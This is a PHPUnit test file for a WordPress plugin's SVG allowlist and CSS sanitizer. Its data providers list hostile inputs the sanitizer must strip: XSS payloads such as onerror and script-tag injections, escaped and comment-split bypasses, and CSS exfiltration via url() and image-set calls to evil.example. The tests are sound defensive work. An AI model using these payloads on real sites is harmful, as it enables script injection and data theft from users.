<?php
declare( strict_types=1 );

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

require_once __DIR__ . '/stubs-cache.php';

/**
 * The inline SVG and style opt-in (1.15.0): the setting, the allowlist and the
 * style-body rules. filter() needs WordPress' tokenizer and real kses, so the
 * hostile payloads run on a live site: tests/wp-env/elementor-sanitize-live.py.
 */
final class InlineMarkupTest extends TestCase {

	protected function setUp(): void {
		unset( IATO_Test_Abilities_State::$options[ IATO_MCP_Inline_Markup::OPTION ] );
		IATO_Test_OAuth_State::$home_url = 'https://site.example';
	}

	// ── The setting ───────────────────────────────────────────────────────

	public function test_off_by_default(): void {
		$this->assertFalse( IATO_MCP_Inline_Markup::is_enabled() );
		$this->assertSame( IATO_MCP_Inline_Markup::STRIPPED_SETTING_OFF, IATO_MCP_Inline_Markup::policy() );
	}

	public function test_on_needs_the_tokenizer_before_anything_else(): void {
		IATO_Test_Abilities_State::$options[ IATO_MCP_Inline_Markup::OPTION ] = '1';
		$this->assertTrue( IATO_MCP_Inline_Markup::is_enabled() );
		if ( class_exists( 'WP_HTML_Tag_Processor' ) ) {
			$this->markTestSkipped( 'WordPress is loaded' );
		}
		$this->assertSame( IATO_MCP_Inline_Markup::STRIPPED_WP_VERSION, IATO_MCP_Inline_Markup::policy() );
	}

	// ── The allowlist ─────────────────────────────────────────────────────

	public function test_only_the_elements_asked_for(): void {
		$this->assertSame(
			[ 'svg', 'g', 'path', 'rect', 'circle', 'ellipse', 'line', 'polyline', 'polygon', 'title', 'text', 'tspan', 'defs', 'lineargradient', 'radialgradient', 'stop', 'marker', 'clippath', 'use' ],
			array_keys( IATO_MCP_Inline_Markup::svg_allowlist() )
		);
		foreach ( [ 'foreignobject', 'script', 'animate', 'set', 'image', 'feimage', 'animatetransform', 'animatemotion' ] as $never ) {
			$this->assertArrayNotHasKey( $never, IATO_MCP_Inline_Markup::svg_allowlist() );
		}
	}

	public function test_no_scripting_or_url_attribute_is_allowed_anywhere(): void {
		foreach ( IATO_MCP_Inline_Markup::svg_allowlist() as $element => $attributes ) {
			foreach ( $attributes as $attribute => $rule ) {
				$this->assertSame( strtolower( (string) $attribute ), (string) $attribute, "{$element}: wp_kses compares lowercased names" );
				$this->assertStringStartsNotWith( 'on', (string) $attribute, $element );
				$this->assertNotContains( $attribute, [ 'xlink:href', 'src', 'action', 'formaction', 'begin', 'to', 'from', 'values', 'attributename' ], $element );
				if ( 'href' === $attribute ) {
					$this->assertSame( 'use', $element, 'href only on use' );
					$this->assertSame( [ 'value_callback' => [ IATO_MCP_Inline_Markup::class, 'is_fragment' ] ], $rule, 'and only as #id' );
				}
			}
		}
	}

	/** @return array<string,array{0:mixed,1:bool}> */
	public static function use_targets(): array {
		return [
			'an id'               => [ '#g1', true ],
			'an id with dots'     => [ '#icon.arrow-1', true ],
			'spaces around'       => [ ' #a ', true ],
			'another file'        => [ 'sprite.svg#a', false ],
			'another site'        => [ 'https://example.com/x.svg#a', false ],
			'protocol relative'   => [ '//example.com/x.svg#a', false ],
			'javascript'          => [ 'javascript:alert(1)', false ],
			'data'                => [ 'data:image/svg+xml,<svg/>#a', false ],
			'a bare hash'         => [ '#', false ],
			'starts with a digit' => [ '#1a', true ],
			'a quote'             => [ '#a"b', false ],
			'not text'            => [ [ '#a' ], false ],
		];
	}

	#[DataProvider( 'use_targets' )]
	public function test_use_points_only_inside_the_document( mixed $href, bool $allowed ): void {
		$this->assertSame( $allowed, IATO_MCP_Inline_Markup::is_fragment( $href ) );
	}

	public function test_every_svg_element_takes_the_aria_attributes_and_the_markers(): void {
		foreach ( IATO_MCP_Inline_Markup::svg_allowlist() as $element => $attributes ) {
			foreach ( [ 'aria-hidden', 'aria-label', 'aria-pressed', 'marker-end', 'clip-path', 'text-anchor' ] as $attribute ) {
				$this->assertArrayHasKey( $attribute, $attributes, $element );
			}
		}
	}

	public function test_viewbox_is_allowed_under_its_lowercase_name(): void {
		$this->assertArrayHasKey( 'viewbox', IATO_MCP_Inline_Markup::svg_allowlist()['svg'] );
	}

	public function test_inline_markup_is_style_or_svg(): void {
		$this->assertTrue( IATO_MCP_Inline_Markup::has_inline_markup( '<p>a</p><STYLE>a{}</STYLE>' ) );
		$this->assertTrue( IATO_MCP_Inline_Markup::has_inline_markup( '<SVG></SVG>' ) );
		$this->assertFalse( IATO_MCP_Inline_Markup::has_inline_markup( '<p title="<svg>">a</p>' ), 'an attribute value is not a tag' );
		$this->assertFalse( IATO_MCP_Inline_Markup::has_inline_markup( '<!-- <style></style> --><path d="M0"/>' ) );
	}

	// ── Style bodies ──────────────────────────────────────────────────────

	/** @return array<string,array{0:string,1:string,2:string[]}> */
	public static function kept_css(): array {
		return [
			'plain rule'           => [ '.a > .b { color: red }', '.a > .b { color: red }', [] ],
			'media query'          => [ '@media (min-width: 1px) { a { color: red } }', '@media (min-width: 1px) { a { color: red } }', [] ],
			'font face same host'  => [ '@font-face { src: url(/f.woff2) }', '@font-face { src: url(/f.woff2) }', [] ],
			'fragment'             => [ 'a { fill: url(#g) }', 'a { fill: url(#g) }', [] ],
			'relative'             => [ 'a { background: url(img/a.png) }', 'a { background: url(img/a.png) }', [] ],
			'this host'            => [ 'a { background: url("https://site.example/a.png") }', 'a { background: url("https://site.example/a.png") }', [] ],
			'www of this host'     => [ "a { background: url('https://www.site.example/a.png') }", "a { background: url('https://www.site.example/a.png') }", [] ],
			'protocol relative'    => [ 'a { background: url(//site.example/a.png) }', 'a { background: url(//site.example/a.png) }', [] ],
			'inline image'         => [ 'a { background: url(data:image/png;base64,AAAA) }', 'a { background: url(data:image/png;base64,AAAA) }', [] ],
			'comment removed'      => [ 'a{}/* note */b{}', 'a{} b{}', [] ],
			'nesting selector'     => [ 'a { &:hover { color: red } & b { color: blue } }', 'a { &:hover { color: red } & b { color: blue } }', [] ],
			'attribute selector'   => [ 'a[href^="/docs/"] { color: red }', 'a[href^="/docs/"] { color: red }', [] ],
			'a large base64 image with slashes' => [ 'a { background: url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) }', 'a { background: url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) }', [] ],
			'selectors with http in them' => [ '.btn-http:hover, .icon-https::before { color: red }', '.btn-http:hover, .icon-https::before { color: red }', [] ],
			'selector naming no site' => [ 'a[href^="https://"], a[href^="http:"] { color: red }', 'a[href^="https://"], a[href^="http:"] { color: red }', [] ],
			'a scheme mid-text, which nothing fetches' => [ 'a::after { content: "see http:evil.example" }', 'a::after { content: "see http:evil.example" }', [] ],
			'plain text with colon' => [ 'a::after { content: "Note: see below" }', 'a::after { content: "Note: see below" }', [] ],
			'svg namespace in an image' => [ "a { background: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E\") }", "a { background: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E\") }", [] ],
			'var for a colour'     => [ 'a { fill: var(--c); background: var(--b, #fff) }', 'a { fill: var(--c); background: var(--b, #fff) }', [] ],
			'an image of this site inside var' => [ 'a { background: var(--b, url("/a.png")) }', 'a { background: var(--b, url("/a.png")) }', [] ],
			'var inside a gradient' => [ 'a { background: linear-gradient(var(--a), var(--b)) }', 'a { background: linear-gradient(var(--a), var(--b)) }', [] ],
			'numbers and units'    => [ 'a { width: 1.5em; margin: .5px 1e3px; color: #0af }', 'a { width: 1.5em; margin: .5px 1e3px; color: #0af }', [] ],
			'an id selector'       => [ '#url { color: red }', '#url { color: red }', [] ],
			'escaped multibyte'    => [ "a::after { content: \"\\€\" }", "a::after { content: \"\\€\" }", [] ],
			'font face'            => [ '@font-face { font-family: "Foo"; src: local("Foo: Bar"), url(/f.woff2) format("woff2") }', '@font-face { font-family: "Foo"; src: local("Foo: Bar"), url(/f.woff2) format("woff2") }', [] ],
			'gradient in image-set' => [ 'a { background: image-set(linear-gradient(red, blue) 1x) }', 'a { background: image-set(linear-gradient(red, blue) 1x) }', [] ],
			'scroll-behavior'      => [ 'html { scroll-behavior: smooth }', 'html { scroll-behavior: smooth }', [] ],
			'overscroll-behavior'  => [ 'a { overscroll-behavior: none }', 'a { overscroll-behavior: none }', [] ],
			'unicode escape'       => [ 'a::after { content: "\2014" }', 'a::after { content: "\2014" }', [] ],
			'image-set this host'  => [ 'a { background: image-set("/a.png" 1x) }', 'a { background: image-set("/a.png" 1x) }', [] ],
		];
	}

	#[DataProvider( 'kept_css' )]
	public function test_css_that_is_kept( string $in, string $out, array $removed ): void {
		$this->assertSame( [ 'css' => $out, 'removed' => $removed ], IATO_MCP_Inline_Markup::sanitize_css( $in ) );
	}

	/** @return array<string,array{0:string,1:string,2:string[]}> */
	public static function stripped_css(): array {
		return [
			'import url'           => [ '@import url(https://evil.example/x.css); a{}', 'a{}', [ '@import url(https://evil.example/x.css);' ] ],
			'import string'        => [ '@import "x.css"; a{}', 'a{}', [ '@import "x.css";' ] ],
			'IMPORT case'          => [ '@IMPORT "x.css"; a{}', 'a{}', [ '@IMPORT "x.css";' ] ],
			'import rejoined'      => [ '@im@import x;port "https://evil.example/B.css";', '@im port "";', [ '@import x;', '"https://evil.example/B.css"' ] ],
			'off-site url'         => [ 'a { background: url(https://evil.example/a.png) }', 'a { background: none }', [ 'url(https://evil.example/a.png)' ] ],
			'quoted off-site'      => [ 'a { background: url( "https://evil.example/a.png" ) }', 'a { background: none }', [ 'url( "https://evil.example/a.png" )' ] ],
			'protocol relative'    => [ 'a { background: url(//evil.example/a.png) }', 'a { background: none }', [ 'url(//evil.example/a.png)' ] ],
			'backslash trick'      => [ 'a { background: url(/\\\\evil.example/a.png) }', 'a { background: none }', [ 'url(/\\\\evil.example/a.png)' ] ],
			'hex slashes'          => [ 'a { background: url(\2f\2f evil.example/a.png) }', 'a { background: none }', [ 'url(\2f\2f evil.example/a.png)' ] ],
			'keeps the selector'   => [ 'input[value^="s"] { background: url(https://evil.example/leak?p=s) }', 'input[value^="s"] { background: none }', [ 'url(https://evil.example/leak?p=s)' ] ],
			'font face off-site'   => [ '@font-face { font-family: x; src: url(https://evil.example/f.woff) }', '@font-face { font-family: x; src: none }', [ 'url(https://evil.example/f.woff)' ] ],
			'nested image-set'     => [ 'a { background: image-set("https://evil.example/p.png" 1x, linear-gradient(rgb(0,0,0),red) 2x) }', 'a { background: none }', [ 'image-set("https://evil.example/p.png" 1x, linear-gradient(rgb(0,0,0),red) 2x)' ] ],
			'parens in a filename' => [ 'a { background: image-set("https://evil.example/F(a(b)c).png" 1x) }', 'a { background: none }', [ 'image-set("https://evil.example/F(a(b)c).png" 1x)' ] ],
			'var indirection'      => [ 'a { --u: "https://evil.example/G.png"; background: image-set(var(--u) 1x) }', 'a { --u: ""; background: none }', [ '"https://evil.example/G.png"', 'image-set(var(--u) 1x)' ] ],
			'if indirection'       => [ 'a { background: image-set(if(style(--a:1):"https://evil.example/X.png";else:"y") 1x) }', 'a { background: none }', [ 'image-set(if(style(--a:1):"https://evil.example/X.png";else:"y") 1x)' ] ],
			'src function'         => [ 'a { background: src("https://evil.example/a.png") }', 'a { background: none }', [ 'src("https://evil.example/a.png")' ] ],
			'cross-fade'           => [ 'a { background: -webkit-cross-fade(url(https://evil.example/a.png), url(/b.png), 50%) }', 'a { background: none }', [ '-webkit-cross-fade(url(https://evil.example/a.png), url(/b.png), 50%)' ] ],
			'other scheme'         => [ 'a { background: url(ftp://site.example/a) }', 'a { background: none }', [ 'url(ftp://site.example/a)' ] ],
			'data but not image'   => [ 'a { background: url(data:text/html,x) }', 'a { background: none }', [ 'url(data:text/html,x)' ] ],
			'lookalike host'       => [ 'a { background: url(https://site.example.evil.example/a) }', 'a { background: none }', [ 'url(https://site.example.evil.example/a)' ] ],
			'image-set off-site'   => [ 'a { background: image-set("https://evil.example/a.png" 1x) }', 'a { background: none }', [ 'image-set("https://evil.example/a.png" 1x)' ] ],
			'image-set inside var' => [ 'a { background-image: var(--n, image-set("https://evil.example/a.png" 1x)) }', 'a { background-image: none }', [ 'var(--n, image-set("https://evil.example/a.png" 1x))' ] ],
			'no slashes, inside var' => [ 'a { background-image: var(--n, image-set("http:evil.example/a.png" 1x)) }', 'a { background-image: none }', [ 'var(--n, image-set("http:evil.example/a.png" 1x))' ] ],
			'var inside var'       => [ 'a { background-image: var(--n, image-set(var(--u) 1x)) }', 'a { background-image: none }', [ 'var(--n, image-set(var(--u) 1x))' ] ],
			'an unknown scheme inside var' => [ "a { background-image: var(--n, url('zhttp:evil.example/a.png')) }", 'a { background-image: none }', [ "var(--n, url('zhttp:evil.example/a.png'))" ] ],
			'quoted url inside var' => [ 'a { background-image: var(--n, url("https://evil.example/a.png")) }', 'a { background-image: none }', [ 'var(--n, url("https://evil.example/a.png"))' ] ],
			'escape before a multibyte character' => [ ".z{--a:\\\"ab€;background-image:image-set('https://evil.example/R2.png' 1x);--b:\\\"ab€}", ".z{--a:\\\"ab€;background-image:none;--b:\\\"ab€}", [ "image-set('https://evil.example/R2.png' 1x)" ] ],
			'-webkit-image-set'    => [ 'a { background: -webkit-image-set(url(https://evil.example/a.png) 1x) }', 'a { background: none }', [ '-webkit-image-set(url(https://evil.example/a.png) 1x)' ] ],
		];
	}

	#[DataProvider( 'stripped_css' )]
	public function test_css_that_loses_a_part( string $in, string $out, array $removed ): void {
		$this->assertSame( [ 'css' => $out, 'removed' => $removed ], IATO_MCP_Inline_Markup::sanitize_css( $in ) );
	}

	/** @return array<string,array{0:string}> */
	public static function dropped_css(): array {
		return [
			'markup'               => [ 'a{} <img src=x onerror=alert(1)>' ],
			'closing tag'          => [ 'a{}</style><script>alert(1)</script>' ],
			'bare less than'       => [ 'a{content:"<"}' ],
			'expression'           => [ 'a { width: expression(alert(1)) }' ],
			'expression spaced'    => [ 'a { width: EXPRESSION (alert(1)) }' ],
			'behavior'             => [ 'a { behavior: url(x.htc) }' ],
			'moz binding'          => [ 'a { -moz-binding: url(x.xml) }' ],
			'javascript url'       => [ 'a { background: url(javascript:alert(1)) }' ],
			'vbscript url'         => [ 'a { background: url(vbscript:x) }' ],
			'escaped less than'    => [ 'a{content:"\3c"}' ],
			'escaped javascript'   => [ 'a { background: url(java\73 cript:alert(1)) }' ],
			'escaped expression'   => [ 'a { width: e\78 pression(alert(1)) }' ],
			'escaped import'       => [ '\40 import "https://evil.example/x.css";' ],
			'escaped url'          => [ 'a { background: \75 rl(https://evil.example/a.png) }' ],
			'comment split'        => [ 'a { width: expre/**/ssion(alert(1)) }' ],
			'char escaped at sign' => [ 'a{}\@import "https://evil.example/x.css";' ],
			'tab in a url'         => [ "a { background: url(/\t/evil.example/a.png) }" ],
			'unterminated url'     => [ 'body{background:url(https://evil.example/A.png' ],
			'unterminated quoted'  => [ 'body{background:url("https://evil.example/M.png' ],
			'unterminated image-set' => [ 'a{background:image-set("https://evil.example/E.png" 1x' ],
			'unterminated comment' => [ 'a{} /* x' ],
			'newline in a string'  => [ "a{content:\"x\ny\"}" ],
			'off-site attribute selector' => [ 'a[href^="https://other.example/"] { color: red }' ],
			'off-site in plain text' => [ 'a::after { content: "Note: see https://x" }' ],
			'scheme with no slashes in a string' => [ 'a::after { content: "http:evil.example" }' ],
			'a number before url(' => [ '.z{--w:1url(/*)"*/);background-image:image-set(\'https://evil.example/R3.png\' 1x);--q:"}' ],
			'a decimal before url(' => [ '.z{--w:1.5url(/*)"*/);background-image:image-set(\'https://evil.example/R3.png\' 1x);--q:"}' ],
			'an exponent before url(' => [ '.z{--w:1e3url(/*)"*/);background-image:image-set(\'https://evil.example/R3.png\' 1x);--q:"}' ],
			'a hash before url('   => [ '.z{--w:#url(/*)"*/);background-image:image-set(\'https://evil.example/R3.png\' 1x);--q:"}' ],
			'text url( as a shield' => [ 'a{--x:"url(";background:url(https://evil.example/C.png)}' ],
			'numeric reference'    => [ '@&#105;mport "https://evil.example/x.css";' ],
			'reference in url'     => [ 'a{background:ur&#108;(https://evil.example/p.png)}' ],
			'named reference'      => [ '&commat;import "https://evil.example/x.css";' ],
			'null byte'            => [ "a{}\0@import 'x';" ],
			'invalid utf-8'        => [ "a{content:\"\xFF\"}" ],
		];
	}

	#[DataProvider( 'dropped_css' )]
	public function test_css_that_loses_the_whole_block( string $in ): void {
		$r = IATO_MCP_Inline_Markup::sanitize_css( $in );
		$this->assertNull( $r['css'], $in );
		$this->assertStringStartsWith( 'whole <style> block', (string) end( $r['removed'] ) );
	}

	public static function site_names(): array {
		return [
			'two urls, the second off-site' => [ 'background-image:url(/a.png),url(https://evil.example/b.png)', true ],
			'image-set inside var'          => [ "background-image:var(--n,image-set('https://evil.example/b.png' 1x))", true ],
			'a parenthesis in the host'     => [ "background-image:url('//site.example).evil.example/b.png')", true ],
			'no slashes'                    => [ 'background:url(http:evil.example/b.png)', true ],
			'one slash'                     => [ 'background:url(https:/evil.example/b.png)', true ],
			'upper case'                    => [ 'background:url(HTTPS://EVIL.EXAMPLE/b.png)', true ],
			'a tab in the slashes'          => [ "background:url(/\t/evil.example/b.png)", true ],
			'a backslash'                   => [ 'background:url(/\\evil.example/b.png)', true ],
			'on-site, then off-site'        => [ 'background:url(//site.example/a.png),url(//evil.example/b.png)', true ],
			'a credential'                  => [ 'background:url(https://site.example@evil.example/b.png)', true ],
			'over-run into this host'       => [ 'background-image:url(//evil.example);--a:@site.example/', true ],
			'a quote in the host'           => [ "background-image:url(\"//site.example'.evil.example/c.png\")", true ],
			'a quote before the host'       => [ "background-image:url(\"//'evil.example/c.png\")", true ],
			'a quote after the namespace'   => [ "background-image:url(\"//www.w3.org'.evil.example/c.png\")", true ],
			'w3 beyond the namespace'       => [ 'background-image:url(https://www.w3.org/w1.png)', true ],
			'three slashes'                 => [ 'background:url(///evil.example/b.png)', true ],
			'other schemes'                 => [ "background-image:url('ftp:evil.example/s.png')", true ],
			'gopher'                        => [ "background-image:url('gopher:evil.example/s.png')", true ],
			'a dot after the host'          => [ 'background:url(//site.example./a.png)', true ],
			'percent in the host'           => [ 'background:url(//%73ite.example/a.png)', true ],
			'real url after a base64 image' => [ "a{background:url(data:image/png;base64,AAAA);b:url('//evil.example/x')}", true ],
			'a quote ends the base64'       => [ "x:data:image/png;base64,AA//\"//evil.example/x", true ],
			'a selector naming a site'      => [ 'a[href^="https://twitter.com"]{}', true ],
			'relative'                      => [ 'background:url(/a.png),url(b.png)', false ],
			'a base64 image with slashes'   => [ 'background:url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)', false ],
			'a selector with http in it'    => [ '.btn-http:hover,.icon-https::before,.http:hover{--http:1}', false ],
			'a path with two slashes'       => [ 'background:url(/img//a.png)', false ],
			'this host with a port'         => [ 'background:url(http://site.example:8889/a.png)', false ],
			'text with two slashes in it'   => [ 'a::after{content:"a//b"}', false ],
			'xlink namespace'               => [ "x:'http://www.w3.org/1999/xlink'", false ],
			'this host'                     => [ 'background:url(https://site.example/a.png)', false ],
			'this host, two urls'           => [ 'background:url(https://site.example/a.png),url(//www.site.example/b.png)', false ],
			'no url at all'                 => [ 'color:red;fill:var(--x)', false ],
			'fragment'                      => [ 'fill:url(#g)', false ],
			'svg namespace'                 => [ "background:url(\"data:image/svg+xml,xmlns='http://www.w3.org/2000/svg'\")", false ],
			'names nothing'                 => [ 'a[href^="https://"]{}', false ],
		];
	}

	#[DataProvider( 'site_names' )]
	public function test_the_plain_search_for_another_site( string $text, bool $leaves ): void {
		$this->assertSame( $leaves, ( new ReflectionMethod( IATO_MCP_Inline_Markup::class, 'text_leaves_site' ) )->invoke( null, $text ), $text );
	}

	public function test_a_long_run_of_slashes_costs_no_memory_and_does_not_pass(): void {
		$before = memory_get_peak_usage();
		$this->assertTrue( ( new ReflectionMethod( IATO_MCP_Inline_Markup::class, 'text_leaves_site' ) )->invoke( null, str_repeat( '/', 200000 ) ) );
		$this->assertLessThan( 8 * 1024 * 1024, memory_get_peak_usage() - $before, 'a capture per position once ran out of memory at 20 KB' );
	}

	public static function style_attributes(): array {
		return [
			'other scheme in a url'  => [ "background-image:url('ftp:evil.example/s.png')", true ],
			'unquoted other scheme'  => [ 'background-image:url(gopher:evil.example/s.png)', true ],
			'image-set inside var'   => [ "background-image:var(--n,image-set('https://evil.example/b.png' 1x))", true ],
			'a string naming a site' => [ "--u:'https://evil.example/b.png'", true ],
			'an unterminated string' => [ 'content:"x', true ],
			'escaped url'            => [ 'background:\\75rl(https://evil.example/a)', true ],
			'a colour'               => [ 'color:red;--brand:#fff;fill:var(--brand)', false ],
			'on this site'           => [ "background:url('/a.png')", false ],
			'this host'              => [ 'background:url(https://site.example/a.png)', false ],
		];
	}

	#[DataProvider( 'style_attributes' )]
	public function test_a_style_attribute( string $value, bool $leaves ): void {
		$this->assertSame( $leaves, ( new ReflectionMethod( IATO_MCP_Inline_Markup::class, 'style_attribute_leaves_site' ) )->invoke( null, $value ), $value );
	}

	public function test_a_large_inline_image_is_not_a_problem(): void {
		$css = 'a{color:red} b{background:image-set("data:image/png;base64,' . str_repeat( 'A', 200000 ) . '" 1x)}';
		$this->assertSame( [ 'css' => $css, 'removed' => [] ], IATO_MCP_Inline_Markup::sanitize_css( $css ) );
		$url = 'a{background:url(data:image/png;base64,' . str_repeat( 'A', 200000 ) . ')}';
		$this->assertSame( [ 'css' => $url, 'removed' => [] ], IATO_MCP_Inline_Markup::sanitize_css( $url ) );
	}

	public function test_a_body_with_nothing_left_is_no_block(): void {
		$this->assertSame( [ 'css' => null, 'removed' => [] ], IATO_MCP_Inline_Markup::sanitize_css( '  /* just a note */  ' ) );
		$this->assertSame( [ 'css' => null, 'removed' => [ '@import "x";' ] ], IATO_MCP_Inline_Markup::sanitize_css( '@import "x";' ) );
	}

	// ── post_content ──────────────────────────────────────────────────────

	public function test_style_blocks_are_taken_out_of_saved_content(): void {
		$this->assertSame( '<p>a</p><p>b</p>', IATO_MCP_Inline_Markup::strip_style_blocks( '<p>a</p><STYLE media=\"print\">x{}</style ><p>b</p>' ) );
		$this->assertSame( '<p>a</p>', IATO_MCP_Inline_Markup::strip_style_blocks( '<p>a</p>' ) );
		$this->assertNull( IATO_MCP_Inline_Markup::strip_style_blocks( null ) );
	}

	public function test_the_content_filter_is_there_only_when_the_tree_holds_a_style_block(): void {
		IATO_Test_Abilities_State::$filters = [];
		$seen = null;
		$out  = IATO_MCP_Inline_Markup::write_without_style_in_content( '[{"html":"<p>a</p>"}]', function () use ( &$seen ) { $seen = IATO_Test_Abilities_State::$filters['content_save_pre'] ?? []; return 'one'; } );
		$this->assertSame( 'one', $out );
		$this->assertSame( [], $seen );

		// Setting off here: a block stored earlier stays in the tree all the same.
		$out = IATO_MCP_Inline_Markup::write_without_style_in_content( '[{"html":"<STYLE>a{}</STYLE>"}]', function () use ( &$seen ) { $seen = IATO_Test_Abilities_State::$filters['content_save_pre'] ?? []; return 'two'; } );
		$this->assertSame( 'two', $out );
		$this->assertSame( [ [ IATO_MCP_Inline_Markup::class, 'strip_style_blocks' ] ], $seen );
		IATO_Test_Abilities_State::$filters = [];
	}
}
